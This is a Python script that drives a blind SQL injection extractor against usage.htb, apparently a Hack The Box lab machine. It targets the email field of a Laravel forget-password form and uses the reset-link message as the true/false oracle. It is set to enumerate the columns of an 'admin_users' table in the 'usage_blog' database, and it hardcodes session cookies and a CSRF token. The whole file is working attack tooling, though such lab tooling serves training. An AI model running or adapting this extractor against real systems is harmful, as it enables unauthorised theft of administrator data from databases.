#!/usr/bin/python3

import signal
import sys
import time
from pwn import log

import utils
import structs
from classes import (
    Extractor,
    GetRequest,
    PostRequest,
    ConditionalPayload,
    TextInCondition,
    StatusEqualCondition,
)


# Ctrl + c
def ctrlC(sig, frame):
    print(
        f"\n\n[{utils.Color.RED}x{utils.Color.END}] {utils.Color.BOLD}Saliendo...{utils.Color.END}\n"
    )
    sys.exit(1)


signal.signal(signal.SIGINT, ctrlC)


def main():
    print(
        f"""
    {utils.Color.BOLD}#####################################################################################################################################{utils.Color.END}
    {utils.Color.BLUE}BBBBB   L      IIIII  N   N  DDDD {utils.Color.END}     {utils.Color.RED} SSS     QQQ    L      IIIII{utils.Color.END}      {utils.Color.BLUE}EEEEE  X   X  TTTTT  RRRR     A    CCCC  TTTTT   OOO   RRRR{utils.Color.END}
    {utils.Color.BLUE}B   B   L        I    NN  N  D   D{utils.Color.END}     {utils.Color.RED}S       Q   Q   L        I  {utils.Color.END}      {utils.Color.BLUE}E       X X     T    R   R   A A   C       T    O   O  R   R{utils.Color.END}
    {utils.Color.BLUE}BBBBB   L        I    N N N  D   D{utils.Color.END}     {utils.Color.RED} SSS    Q   Q   L        I  {utils.Color.END}      {utils.Color.BLUE}EEEE     X      T    RRRR   AAAAA  C       T    O   O  RRRR{utils.Color.END}
    {utils.Color.BLUE}B   B   L        I    N  NN  D   D{utils.Color.END}         {utils.Color.RED}S   Q  QQ   L        I  {utils.Color.END}      {utils.Color.BLUE}E       X X     T    R  R   A   A  C       T    O   O  R  R{utils.Color.END}
    {utils.Color.BLUE}BBBBB   LLLLL  IIIII  N   N  DDDD {utils.Color.END}     {utils.Color.RED}SSSS     QQ  Q  LLLLL  IIIII{utils.Color.END}      {utils.Color.BLUE}EEEEE  X   X    T    R   R  A   A  CCCC    T     OOO   R   R{utils.Color.END}
    {utils.Color.BOLD}#####################################################################################################################################{utils.Color.END}\n
    """
    )

    # Initiate parameters specifying them
    main_url = "http://usage.htb/forget-password"
    headers = {
        "Cookie": "XSRF-TOKEN=eyJpdiI6IkQya244dG1yNFArTkNSRktHOGZVUEE9PSIsInZhbHVlIjoiVU5YcGI3R2JUUTR5aFZNRkpxRzlib2N3eWdVTlJlM2FOZy82TitIQmt2THNVSGFGaWp1eERob2xFenBTWWkxSk5ldXUrNHZhS2FjcFUzMlIyRk4zdXBjdzV2VnQ4Z1R2NE5sTVhMQ0cyOFdxczZLVTlxWkdlQUV5R1FEaGdQTnoiLCJtYWMiOiJjYWUxYWI1MDA1MmMyYWU5YTc5YzQ1NjA4MWE0MDMxNGQzYjEyYmU4YmFlODhiN2Q2MzhmOTc5NGUzMzRiODliIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImNYUExKUmZ0M0J2OFQ5Z0JRcjJ0ckE9PSIsInZhbHVlIjoiK3hyU2owVjJrMHRGMU9uMU44MEs3dnF2RWJlM2x2U3JRMDdjQWFZUTQrTElvMFVydXR5Z3NhSzRXN0kvZUFqUU0xaUxHM2dQUVNMWWRISUc3SnNMcm0xYStiKzJRM3ZoWjBicHV6OVhUOS9Vd3lkNEtEWXdYTGxQWFNlVEJiV0IiLCJtYWMiOiJiOThhMzA0MmE5ZmQxYTcyYTMwNThhMmNiMGEwOTA4OGVmOGIxNjk0YWFkMDE3YzI4ZWNkODgxYmE3NmExMDliIiwidGFnIjoiIn0%3D"
    }
    method = PostRequest()
    data = {
        "_token": "Me3jfd1A8zgq9XYzGmuSPr4sfEZDDwcusuTw6xU0",
        "email": "test@gmail.com",
    }
    atribute_to_exploit = "email"
    condition = TextInCondition("We have e-mailed your password reset link to ")
    payload = ConditionalPayload()
    num_threads = 1

    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Url:{utils.Color.END} {main_url}"
    )
    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Method:{utils.Color.END} {method}"
    )
    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Headers:{utils.Color.END} {headers}"
    )
    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Data:{utils.Color.END} {data}"
    )
    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Field to exploit:{utils.Color.END} {atribute_to_exploit}"
    )
    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Condition:{utils.Color.END} {condition}"
    )
    print(
        f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Threads:{utils.Color.END} {num_threads}"
    )

    instance = Extractor(
        main_url,
        headers,
        data,
        method,
        condition,
        payload,
        num_threads,
        atribute_to_exploit,
    )

    print("\n")
    label_menu = log.progress(utils.Color.RED + "Brute Force" + utils.Color.END)
    label_menu.status(" Starting ...")
    print("\n")
    time.sleep(1)

    instance._dbs.append(structs.DB("usage_blog", []))
    instance._dbs[0].tables.append(structs.Table("admin_users", [], []))

    # instance.get_user(label_menu)
    # instance.get_dbs(label_menu)
    # instance.get_tables(label_menu)
    instance.get_columns(label_menu)
    # instance.get_rows(label_menu)
    # instance.build_file()


if __name__ == "__main__":
    main()
